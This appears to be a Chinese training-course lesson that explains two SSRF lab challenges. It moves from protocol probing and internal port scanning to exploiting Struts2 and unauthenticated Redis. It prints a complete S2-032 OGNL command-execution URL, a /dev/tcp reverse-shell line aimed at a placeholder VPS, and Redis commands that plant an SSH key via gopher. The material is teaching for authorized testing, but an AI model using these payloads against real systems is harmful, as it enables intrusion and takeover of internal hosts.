# 课程P37：第35天：SSRF漏洞课程考核讲解 🎯

![](img/8924752386fca6d2d90de48fc229a422_1.png)

![](img/8924752386fca6d2d90de48fc229a422_2.png)

在本节课中，我们将对上节课布置的两个SSRF漏洞实战考核题目进行详细讲解。我们将一起回顾SSRF漏洞的测试与利用思路，分析题目中的关键点，并学习如何将理论知识应用于解决实际问题。

---

![](img/8924752386fca6d2d90de48fc229a422_4.png)

## 概述

![](img/8924752386fca6d2d90de48fc229a422_6.png)

![](img/8924752386fca6d2d90de48fc229a422_8.png)

![](img/8924752386fca6d2d90de48fc229a422_9.png)

![](img/8924752386fca6d2d90de48fc229a422_11.png)

![](img/8924752386fca6d2d90de48fc229a422_13.png)

本节课是Web安全培训系列课程的最后一节核心内容课。我们将聚焦于SSRF漏洞的实战考核，通过分析两个具体的题目，串联起SSRF漏洞的发现、信息探测和利用的完整思路。理解这些思路对于后续的就业实战至关重要。

---

## 题目回顾与整体思路

上节课我们布置了两个SSRF相关的实战题目。这两个题目的核心考点是：**在`file://`协议被过滤的情况下，如何利用其他协议进行内网探测和攻击**。

一个直接的思路是，如果`file://`协议可用，已知flag文件位置，则可以直接通过`file:///path/to/flag`读取。但题目刻意过滤了此协议，增加了挑战性。

接下来，我们将按照标准的SSRF利用流程，逐步拆解解题步骤。

![](img/8924752386fca6d2d90de48fc229a422_15.png)

![](img/8924752386fca6d2d90de48fc229a422_17.png)

![](img/8924752386fca6d2d90de48fc229a422_19.png)

![](img/8924752386fca6d2d90de48fc229a422_21.png)

---

## SSRF漏洞利用标准流程

![](img/8924752386fca6d2d90de48fc229a422_23.png)

![](img/8924752386fca6d2d90de48fc229a422_25.png)

![](img/8924752386fca6d2d90de48fc229a422_27.png)

![](img/8924752386fca6d2d90de48fc229a422_29.png)

上一节我们介绍了SSRF漏洞的基本概念，本节中我们来看看如何系统地利用一个SSRF漏洞。标准的利用流程通常包含以下几个步骤：

![](img/8924752386fca6d2d90de48fc229a422_31.png)

![](img/8924752386fca6d2d90de48fc229a422_33.png)

![](img/8924752386fca6d2d90de48fc229a422_35.png)

![](img/8924752386fca6d2d90de48fc229a422_37.png)

### 1. 探测支持的URL协议

首先，我们需要确定目标后端支持哪些URL协议（Schema）。这是所有后续攻击的基础。

以下是常见的用于测试的协议及方法：
*   **`http://` / `https://`**: 输入一个公网URL（如`http://www.baidu.com`），观察是否返回该页面的源代码。若能返回，则证明后端会向指定URL发起请求并回显结果。
*   **`dict://`**: 尝试连接一个由我们控制的公网服务器的已知端口（如`dict://your-vps-ip:22`）。在服务器端监听该端口，若收到连接请求，则证明`dict://`协议可用，并能用于探测内网端口和服务信息。
*   **`ftp://`**: 类似地，尝试`ftp://your-vps-ip:21`。在服务器端监听21端口，验证连接是否建立。
*   **`gopher://`**: 这是一个功能强大的协议，可以构造特定数据包攻击内网服务（如Redis、MySQL）。需要先验证其是否被支持。
*   **`file://`**: 尝试读取系统文件（如`file:///etc/passwd`），但在此次题目中已被过滤。

![](img/8924752386fca6d2d90de48fc229a422_39.png)

通过以上测试，我们确认了目标支持`dict://`和`ftp://`等协议，为后续探测铺平了道路。

![](img/8924752386fca6d2d90de48fc229a422_41.png)

![](img/8924752386fca6d2d90de48fc229a422_43.png)

![](img/8924752386fca6d2d90de48fc229a422_45.png)

### 2. 探测内网资产信息

![](img/8924752386fca6d2d90de48fc229a422_47.png)

![](img/8924752386fca6d2d90de48fc229a422_48.png)

在确认可利用`dict://`协议后，下一步是探测目标内网开放的端口及服务。

手动测试效率低下。以下是高效探测的方法：
*   使用Burp Suite的Intruder模块，对目标内网IP（如`127.0.0.1`）的1-65535端口进行爆破。
*   Payload设置为：`dict://127.0.0.1:§port§`
*   通过分析响应（如状态码、返回的Banner信息）来判断端口开放情况。

例如，探测结果可能显示开放了以下端口：
*   `22` -> SSH服务
*   `3306` -> MySQL数据库
*   `8080` -> Tomcat/HTTP服务
*   `6379` -> Redis服务

![](img/8924752386fca6d2d90de48fc229a422_50.png)

![](img/8924752386fca6d2d90de48fc229a422_52.png)

### 3. 针对具体服务进行攻击

获取内网端口信息后，就可以针对具体的服务展开攻击。这是利用SSRF漏洞获取Shell或敏感信息的关键一步。

![](img/8924752386fca6d2d90de48fc229a422_54.png)

![](img/8924752386fca6d2d90de48fc229a422_56.png)

![](img/8924752386fca6d2d90de48fc229a422_58.png)

![](img/8924752386fca6d2d90de48fc229a422_60.png)

![](img/8924752386fca6d2d90de48fc229a422_62.png)

以下是根据不同端口的常见攻击思路：
*   **22端口 (SSH)**: 若存在弱口令，可尝试爆破。但更常见的利用方式是结合其他漏洞（如Web漏洞获取权限后）写入SSH公钥实现免密登录。
*   **3306端口 (MySQL)**: 利用Gopher协议攻击MySQL，通常需要已知数据库账号密码。
*   **6379端口 (Redis)**: 利用Redis未授权访问漏洞，通过Gopher协议写入SSH公钥、Webshell或定时任务来反弹Shell。
*   **8080端口 (HTTP)**: 访问该Web服务，识别其框架（如Struts2），寻找对应的历史漏洞进行利用。

![](img/8924752386fca6d2d90de48fc229a422_64.png)

![](img/8924752386fca6d2d90de48fc229a422_66.png)

![](img/8924752386fca6d2d90de48fc229a422_68.png)

---

## 题目一详解：有回显的SSRF

![](img/8924752386fca6d2d90de48fc229a422_70.png)

![](img/8924752386fca6d2d90de48fc229a422_72.png)

![](img/8924752386fca6d2d90de48fc229a422_74.png)

![](img/8924752386fca6d2d90de48fc229a422_76.png)

第一个题目是一个典型的SSRF漏洞点，提示输入URL，并会返回访问结果。

![](img/8924752386fca6d2d90de48fc229a422_78.png)

![](img/8924752386fca6d2d90de48fc229a422_79.png)

![](img/8924752386fca6d2d90de48fc229a422_80.png)

![](img/8924752386fca6d2d90de48fc229a422_81.png)

![](img/8924752386fca6d2d90de48fc229a422_82.png)

![](img/8924752386fca6d2d90de48fc229a422_84.png)

![](img/8924752386fca6d2d90de48fc229a422_86.png)

### 解题步骤

![](img/8924752386fca6d2d90de48fc229a422_88.png)

1.  **协议探测**：验证支持`dict://`协议。
2.  **端口扫描**：使用Burp Suite爆破内网端口，发现开放`8080`端口。
3.  **服务识别**：访问`http://127.0.0.1:8080`，根据返回信息识别出是**Struts2**框架。
4.  **漏洞利用**：查找Struts2的历史漏洞PoC进行测试。例如，使用S2-032漏洞的PoC执行命令：
    `http://127.0.0.1:8080/xxx.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=whoami&pp=\\A&ppp=%20&encoding=UTF-8`
    若回显`root`，则证明命令执行成功。
5.  **获取Shell**：将PoC中的`cmd`参数替换为反弹Shell命令（如`bash -i >& /dev/tcp/your-vps-ip/port 0>&1`），在公网VPS上监听对应端口，即可获得一个内网Shell。

![](img/8924752386fca6d2d90de48fc229a422_90.png)

**核心思路**：利用SSRF作为跳板，攻击内网中存在的脆弱Web应用（Struts2），通过其RCE漏洞获取内网主机权限。

![](img/8924752386fca6d2d90de48fc229a422_92.png)

---

![](img/8924752386fca6d2d90de48fc229a422_94.png)

![](img/8924752386fca6d2d90de48fc229a422_96.png)

![](img/8924752386fca6d2d90de48fc229a422_98.png)

## 题目二详解：结合Redis未授权访问

![](img/8924752386fca6d2d90de48fc229a422_100.png)

![](img/8924752386fca6d2d90de48fc229a422_102.png)

![](img/8924752386fca6d2d90de48fc229a422_104.png)

![](img/8924752386fca6d2d90de48fc229a422_106.png)

第二个题目是“网站源码获取系统”，同样存在SSRF。

![](img/8924752386fca6d2d90de48fc229a422_108.png)

![](img/8924752386fca6d2d90de48fc229a422_110.png)

![](img/8924752386fca6d2d90de48fc229a422_112.png)

![](img/8924752386fca6d2d90de48fc229a422_114.png)

### 解题步骤

![](img/8924752386fca6d2d90de48fc229a422_116.png)

![](img/8924752386fca6d2d90de48fc229a422_118.png)

![](img/8924752386fca6d2d90de48fc229a422_120.png)

1.  **信息收集**：同样通过`dict://`协议探测到内网开放`6379`端口（Redis）。
2.  **漏洞验证**：尝试直接连接`redis://127.0.0.1:6379`，或利用SSRF探测Redis信息，确认存在未授权访问漏洞。
3.  **利用准备**：Redis未授权访问常通过**Gopher协议**进行攻击。我们需要生成一个能写入SSH公钥或计划任务的Payload。
4.  **Payload生成与转换**：直接使用Redis客户端命令无法通过Gopher发送，需要将其转换为Gopher协议可发送的格式。
    *   **原始Redis命令**（写入SSH公钥示例）：
        ```
        flushall
        set 1 '公钥内容'
        config set dir /root/.ssh/
        config set dbfilename authorized_keys
        save
        ```
    *   **转换规则**：
        1.  去掉响应行（如`+OK`）和无关信息。
        2.  将每行命令末尾的`\r\n`替换为URL编码`%0d%0a`。
        3.  将所有行连接成一行字符串。
    *   **最终Gopher Payload**：
        `gopher://127.0.0.1:6379/_转换后的单行字符串`
5.  **发起攻击**：将生成的Payload通过题目中的SSRF漏洞点提交。如果成功，公钥将被写入目标Redis服务器的`/root/.ssh/authorized_keys`文件。
6.  **登录系统**：使用对应的私钥，通过SSH直接免密登录目标内网服务器。

**简化工具**：可以使用现成脚本（如`redis-rogue-server`或`Gopherus`）自动生成攻击Redis的Gopher Payload。
例如使用Gopherus：
```bash
python gopherus.py --exploit redis
```
然后选择反弹Shell或写入Webshell，并设置监听IP，工具会自动生成Payload。

---

## 总结与课程展望

本节课中，我们一起深入分析了两个SSRF漏洞的实战考核题目。我们系统性地回顾了从协议探测、内网端口扫描到针对特定服务（如Struts2、Redis）进行深度利用的完整链条。

![](img/8924752386fca6d2d90de48fc229a422_122.png)

![](img/8924752386fca6d2d90de48fc229a422_124.png)

**核心要点总结**：
1.  **SSRF利用基础**：确认支持的非HTTP协议（如`dict://`, `gopher://`）是内网探测的前提。
2.  **信息收集是关键**：使用工具（如Burp Intruder）高效探测内网端口，识别服务。
3.  **漏洞串联**：SSRF本身可能无法直接获取数据，但其价值在于作为**攻击内网的跳板**，需要与内网服务漏洞（如Struts2 RCE、Redis未授权）结合利用。
4.  **协议利用**：`gopher://`协议功能强大，是攻击内网数据库、缓存等服务的利器，但需掌握Payload的转换方法。

![](img/8924752386fca6d2d90de48fc229a422_126.png)

通过本次考核讲解，希望大家能将SSRF的理论知识融会贯通，形成清晰的渗透测试思维。后续课程将进入就业指导阶段，帮助大家梳理知识体系，准备简历与面试。